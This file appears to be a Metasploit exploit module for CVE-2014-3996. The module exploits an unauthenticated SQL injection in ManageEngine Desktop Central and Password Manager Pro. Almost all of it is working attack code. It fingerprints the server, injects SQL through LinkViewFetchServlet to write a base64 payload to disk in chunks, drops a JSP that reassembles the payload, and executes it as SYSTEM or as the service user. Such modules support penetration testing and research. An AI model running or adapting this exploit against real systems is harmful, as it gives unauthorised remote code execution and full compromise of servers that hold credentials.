##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/file_dropper'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Password Manager Pro v6-v7 b7002 / Desktop Central v7-v9 b90033 SQL Injection",
      'Description'    => %q{
          This module exploits an unauthenticated blind SQL injection in LinkViewFetchServlet,
          which is exposed in ManageEngine Desktop Central v7 build 70200 to v9 build 90033 and
          Password Manager Pro v6 build 6500 to v7 build 7002 (including the MSP versions). The
          SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as
          the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older
          or upgraded builds). MySQL targets are more reliable due to the use of relative paths;
          with PostgreSQL you should find the web root path via other means and specify it with
          WEB_ROOT.

          The injection is only exploitable via a GET request, which means that the payload
          has to be sent in chunks smaller than 8000 characters (URL size limitation). Small
          payloads and the use of exe-small is recommended, as you can only do between 10 and
          20 injections before using up all the available ManagedConnections until the next
          server restart.

          This vulnerability exists in all versions released since 2006, however builds below
          DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler. You can still try your
          luck using the MySQL targets as a JDK might be installed in the $PATH.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'  # Vulnerability discovery and MSF module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-3996' ],
          [ 'OSVDB', '110198' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/me_dc_pmp_it360_sqli.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Aug/55' ]
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => %w{ linux win },
      'Targets'        =>
        [
          [  'Automatic', {}  ],
          [  'Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',
            {
              'Web_root' => 'C:\\ManageEngine\\DesktopCentral_Server\\webapps\\DesktopCentral\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',
            {
              'Web_root' => 'C:\\ManageEngine\\DesktopCentralMSP_Server\\webapps\\DesktopCentral\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows',
            {
              'Web_root' => '../../webapps/DesktopCentral/',
              'Database' => 'mysql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows',
            {
              'Web_root' => 'C:\\ManageEngine\\PMP\\webapps\\PassTrix\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows',
            {
              'Web_root' => '../../webapps/PassTrix/',
              'Database' => 'mysql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux',
            {
              'Web_root' => '/opt/ManageEngine/PMP/webapps/PassTrix/',
              'Database' => 'postgresql',
              'Platform' => 'linux'
            }
          ],
          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux',
            {
              'Web_root' => '../../webapps/PassTrix/',
              'Database' => 'mysql',
              'Platform' => 'linux'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,            # Privileged on Windows but not on Linux targets
      'DisclosureDate' => "Jun 8 2014"))

    register_options(
      [
        OptPort.new('RPORT',
          [true, 'The target port', 8020]),
        OptBool.new('SSL',
          [true, 'Use SSL', false]),
        OptInt.new('CHUNK_SIZE',
          [true, 'Number of characters to send per request (< 7800)', 7500]),
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep between injections (x1 for MySQL, x2.5 for PostgreSQL)', 2]),
        OptBool.new('EXE_SMALL',
          [true, 'Use exe-small encoding for better reliability', true]),
        OptString.new('WEB_ROOT',
          [false, 'Slash terminated web server root filepath (escape Windows paths with 4 slashes \\\\\\\\)'])
      ], self.class)
  end


  def check
    # Test for Desktop Central
    res = send_request_cgi({
      'uri' => normalize_uri("configurations.do"),
      'method' => 'GET'
    })

    if res and res.code == 200
      if res.body.to_s =~ /ManageEngine Desktop Central 7/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 7/                    # DC v7
        # DC v7 uses the MySQL database
        print_status("#{peer} - Detected Desktop Central v7 (MySQL)")
        return Exploit::CheckCode::Appears
      elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 8/
        if res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/                 # DC v8
          build = $1
          if build > "80200"
            print_status("#{peer} - Detected Desktop Central v8 #{build}")
            return Exploit::CheckCode::Appears
          else
            print_status("#{peer} - Detected Desktop Central v8 #{build} (MySQL)")
          end
        else
          print_status("#{peer} - Detected Desktop Central v8 (MySQL)")
        end
        # DC v8 < 80200 uses the MySQL database
        return Exploit::CheckCode::Appears
      elsif res.body.to_s =~ /ManageEngine Desktop Central 9/ or
       res.body.to_s =~ /ManageEngine Desktop Central MSP 9/
        if res.body.to_s =~ /id="buildNum" value="([0-9]+)"\/>/                 # DC v9
          build = $1
          print_status("#{peer} - Detected Desktop Central v9 #{build}")
          if build < "90039"
            return Exploit::CheckCode::Appears
          else
            return Exploit::CheckCode::Safe
          end
        end
      end
    end

    # Test for Password Manager Pro
    res = send_request_cgi({
        'uri' => normalize_uri("PassTrixMain.cc"),
        'method' => 'GET'
    })

    if res and res.code == 200 and
    res.body.to_s =~ /ManageEngine Password Manager Pro/ and
    (res.body.to_s =~ /login\.css\?([0-9]+)/ or                                 # PMP v6
    res.body.to_s =~ /login\.css\?version=([0-9]+)/ or                          # PMP v6
    res.body.to_s =~ /\/themes\/passtrix\/V([0-9]+)\/styles\/login\.css"/)      # PMP v7
      build = $1
      if build < "7003"
        if build < "6800"
        # PMP v6 < 6800 uses the MySQL database
          print_status("#{peer} - Detected Password Manager Pro v6 #{build} (MySQL)")
        else
          print_status("#{peer} - Detected Password Manager Pro v6 / v7 #{build}")
        end
        if build >= "6500"
          # if it's a build below 6500, it will only work if we have a JSP compiler
          return Exploit::CheckCode::Appears
        end
      else
        print_status("#{peer} - Detected Password Manager Pro v6 / v7 #{build}")
        return Exploit::CheckCode::Safe
      end
    end
  end


  def pick_target
    return target if target.name != 'Automatic'

    print_status("#{peer} - Selecting target, this might take a few seconds...")
    rand_txt = rand_text_alpha_lower(8) << ".txt"

    # Test for Desktop Central
    res = send_request_cgi({
      'uri' => normalize_uri("configurations.do"),
      'method' => 'GET'
    })

    if res and res.code == 200 and res.body.to_s =~ /ManageEngine Desktop Central/
      if datastore['WEB_ROOT']
        postgresql_path = datastore['WEB_ROOT'].dup
        mysql_path = datastore['WEB_ROOT'].dup
      elsif res.body.to_s =~ /ManageEngine Desktop Central MSP/
        postgresql_path = targets[2]['Web_root'].dup
        mysql_path = targets[3]['Web_root'].dup
      else
        postgresql_path = targets[1]['Web_root'].dup
        mysql_path = targets[3]['Web_root'].dup
      end
    else
      # Test for Password Manager Pro
      res = send_request_cgi({
        'uri' => normalize_uri("PassTrixMain.cc"),
        'method' => 'GET'
      })

      if res and res.code == 200 and res.body.to_s =~ /ManageEngine Password Manager Pro/
        if datastore['WEB_ROOT']
          postgresql_path = datastore['WEB_ROOT'].dup
          mysql_path = datastore['WEB_ROOT'].dup
        else
          postgresql_path = targets[4]['Web_root'].dup
          mysql_path = targets[5]['Web_root'].dup
        end
      else
        # We don't know what this is, bail
        return nil
      end
    end

    # try MySQL first, there are probably more of these out there
    filepath = mysql_path << rand_txt

    # @@version_compile_os will give us Win32 / Win64 if it's a Windows target
    inject_sql("select @@version_compile_os into dumpfile '#{filepath}'", "mysql")

    res = send_request_cgi({
      'uri' => normalize_uri(rand_txt),
      'method' => 'GET'
    })

    if res and res.code == 200
      register_file_for_cleanup(filepath.sub('../',''))
      if res.body.to_s =~ /Win32/ or res.body.to_s =~ /Win64/
        if mysql_path =~ /DesktopCentral/
          # Desktop Central [MSP] / MySQL / Windows
          return targets[3]
        else
          # Password Manager Pro / MySQL / Windows
          return targets[5]
        end
      else
        # Password Manager Pro / MySQL / Linux
        return targets[7]
      end
    end

    # didn't work, let's try PostgreSQL
    filepath = postgresql_path << rand_txt

    # version() will tell us if it's compiled by Visual C++ (Windows) or gcc (Linux)
    inject_sql("copy (select version()) to '#{filepath}'", "postgresql")

    res = send_request_cgi({
      'uri' => normalize_uri(rand_txt),
      'method' => 'GET'
    })

    if res and res.code == 200
      register_file_for_cleanup(filepath)
      if res.body.to_s =~ /Visual C++/
        if postgresql_path =~ /DesktopCentral_Server/
          # Desktop Central / PostgreSQL / Windows
          return targets[1]
        elsif postgresql_path =~ /DesktopCentralMSP_Server/
          # Desktop Central MSP / PostgreSQL / Windows
          return targets[2]
        else
          # Password Manager Pro / PostgreSQL / Windows
          return targets[4]
        end
      elsif res.body.to_s =~ /linux/
         # This is for the case when WEB_ROOT is provided
         # Password Manager Pro / PostgreSQL / Linux
         return targets[6]
      end
    else
      # OK, it's Password Manager Pro on Linux, probably using PostgreSQL and
      # no WEB_ROOT was provided. Let's try one of the defaults before bailing out.
      filepath = targets[5]['Web_root'].dup << rand_txt
      inject_sql("copy (select version()) to '#{filepath}'", "postgresql")

      res = send_request_cgi({
        'uri' => normalize_uri(rand_txt),
        'method' => 'GET'
      })

      if res and res.code == 200 and res.body.to_s =~ /linux/
        # Password Manager Pro / PostgreSQL / Linux
        return targets[6]
      else
        return nil
      end
    end
  end

  #
  # Creates the JSP that will assemble the payload on the server
  #
  def generate_jsp_encoded(files)
    native_payload_name = rand_text_alpha(rand(6)+3)
    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'

    var_raw     = rand_text_alpha(rand(8) + 3)
    var_ostream = rand_text_alpha(rand(8) + 3)
    var_buf     = rand_text_alpha(rand(8) + 3)
    var_decoder = rand_text_alpha(rand(8) + 3)
    var_tmp     = rand_text_alpha(rand(8) + 3)
    var_path    = rand_text_alpha(rand(8) + 3)
    var_proc2   = rand_text_alpha(rand(8) + 3)
    var_files   = rand_text_alpha(rand(8) + 3)
    var_ch      = rand_text_alpha(rand(8) + 3)
    var_istream = rand_text_alpha(rand(8) + 3)
    var_file    = rand_text_alpha(rand(8) + 3)

    files_decl = "{ "
    files.each { |file|  files_decl << "\"#{file}\"," }
    files_decl[-1] = "}"

    if @my_target['Platform'] == 'linux'
      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
      chmod = %Q|
      Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
      Thread.sleep(200);
      |

      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
      cleanup = %Q|
      Thread.sleep(200);
      Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
      |
    else
      chmod = ''
      cleanup = ''
    end

    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    String[] #{var_files} = #{files_decl};
    try {
      int #{var_ch};
      StringBuilder #{var_buf} = new StringBuilder();
      for (String #{var_file} : #{var_files}) {
        BufferedInputStream #{var_istream} =
          new BufferedInputStream(new FileInputStream(#{var_file}));
        while((#{var_ch} = #{var_istream}.read())!= -1)
          #{var_buf}.append((char)#{var_ch});
        #{var_istream}.close();
      }

      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |

    jsp = jsp.gsub(/\n/, '')
    jsp = jsp.gsub(/\t/, '')

    if @my_target['Database'] == 'postgresql'
      # Ruby's base64 encoding adds newlines at every 60 chars, strip them
      [jsp].pack("m*").gsub(/\n/, '')
    else
      # Assuming mysql, applying hex encoding instead
      jsp.unpack("H*")[0]
    end
  end


  def inject_sql(sqli_command, target = nil)
    target = (target == nil) ? @my_target['Database'] : target
    if target == 'postgresql'
      sqli_prefix = "viewname\";"
      sqli_suffix = ";-- "
    else
      # Assuming mysql
      sqli_prefix = "viewname\" union "
      sqli_suffix = "#"
    end

    send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri("LinkViewFetchServlet.dat"),
      'vars_get'  => {
        'sv'    => sqli_prefix << sqli_command << sqli_suffix
      }
    })

    if target == 'postgresql'
      # PostgreSQL sometimes takes a while to write to the disk, so sleep more
      sleep(datastore['SLEEP'] * 2.5)
    else
      # Assuming mysql
      sleep(datastore['SLEEP'])
    end
   end

  #
  # Generate the actual payload
  #
  def generate_exe_payload
    opts = {:arch => @my_target.arch, :platform => @my_target.platform}
    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)
    if datastore['EXE_SMALL'] and @my_target['Platform'] == 'win'
      exe = Msf::Util::EXE.to_executable_fmt(framework, arch, platform,
        payload.encoded, "exe-small", opts)
    else
      exe = generate_payload_exe(opts)
    end
    Rex::Text.encode_base64(exe)
  end

  #
  # Uploads the payload in chunks and then calls the JSP that will assemble them
  # (runs the actual exploit).
  #
  def inject_exec(jsp_name, fullpath)
    base64_exe = generate_exe_payload
    base64_exe_len = base64_exe.length

    # We will be injecting in CHUNK_SIZE steps
    chunk_size = datastore['CHUNK_SIZE']
    copied = 0
    counter = 0
    if base64_exe_len < chunk_size
      chunk_size = base64_exe_len
    end
    chunks = (base64_exe_len.to_f / chunk_size).ceil
    time = chunks * datastore['SLEEP'] *
     ((@my_target['Database'] == 'postgresql') ? 2.5 : 1)

    # We dump our files in either C:\Windows\system32 or /tmp
    # It's not very clean, but when using a MySQL target we have no other choice
    # as we are using relative paths for injection.
    # The Windows path has to be escaped with 4 backslashes because ruby eats one
    # and the JSP eats the other.
    files = Array.new(chunks)
    files.map! {
      |file|
      if @my_target['Platform'] == 'win'
        file = "C:\\\\windows\\\\system32\\\\" + rand_text_alpha(rand(8)+3)
      else
        # Assuming Linux, let's hope we can write to /tmp
        file = "/tmp/" + rand_text_alpha(rand(8)+3)
      end
    }

    print_status("#{peer} - Payload size is #{base64_exe_len}, injecting #{chunks}" +
     " chunks in #{time} seconds")

    if @my_target['Database'] == 'postgresql'
      inject_sql("copy (select '#{base64_exe[copied,chunk_size]}') to '#{files[counter]}'")
    else
      # Assuming mysql
      inject_sql("select '#{base64_exe[copied,chunk_size]}' from mysql.user into dumpfile" +
       " '#{files[counter]}'")
    end
    register_file_for_cleanup(files[counter])
    copied += chunk_size
    counter += 1

    while copied < base64_exe_len
      if (copied + chunk_size) > base64_exe_len
        # Last loop
        chunk_size = base64_exe_len - copied
      end
      if @my_target['Database'] == 'postgresql'
        inject_sql("copy (select '#{base64_exe[copied,chunk_size]}') to " +
          "'#{files[counter]}'")
      else
        # Assuming mysql
        inject_sql("select '#{base64_exe[copied,chunk_size]}' from mysql.user into " +
         "dumpfile '#{files[counter]}'")
      end
      register_file_for_cleanup(files[counter])
      copied += chunk_size
      counter += 1
    end

    jsp_encoded = generate_jsp_encoded(files)
    if @my_target['Database'] == 'postgresql'
      inject_sql("copy (select convert_from(decode('#{jsp_encoded}','base64'),'utf8'))" +
       " to '#{fullpath}'")
    else
      inject_sql("select 0x#{jsp_encoded} from mysql.user into dumpfile '#{fullpath}'")
    end
    print_status("#{peer} - Requesting #{jsp_name}")
    send_request_raw({'uri' => normalize_uri(jsp_name)})

    handler
  end


  def exploit
    @my_target = pick_target
    if @my_target.nil?
      fail_with(Failure::NoTarget, "#{peer} - Automatic targeting failed.")
    else
      print_status("#{peer} - Selected target #{@my_target.name}")
    end
    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.
    # Fail if this is the case to avoid polluting the web root any more.
    if @my_target['Platform'] == 'linux' and payload_instance.name =~ /Windows/
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
    end

    if datastore['WEB_ROOT']
      web_root = datastore['WEB_ROOT']
    else
      web_root = @my_target['Web_root']
    end

    jsp_name  = rand_text_alpha_lower(8) + ".jsp"
    fullpath = web_root + jsp_name
    register_file_for_cleanup(fullpath.sub('../',''))

    inject_exec(jsp_name, fullpath)
  end
end
